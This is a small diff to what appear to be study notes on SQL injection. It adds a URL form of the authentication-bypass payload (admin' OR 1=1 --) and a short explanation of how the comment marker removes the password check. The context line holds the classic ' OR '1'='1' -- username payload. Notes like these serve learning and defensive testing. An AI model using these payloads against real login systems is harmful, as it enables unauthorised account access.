@@ -2,6 +2,11 @@
 - login without password as first user in database (usually admin)
     
     `' OR '1'='1' --` written as username
+    `/login?user=admin' OR 1=1 --`
+
+    SQL will work if both conditions are TRUE
+    `WHERE username = 'admin' AND password = '1234'`
+    `--` comment the next part (the password asking)
     
     or
     
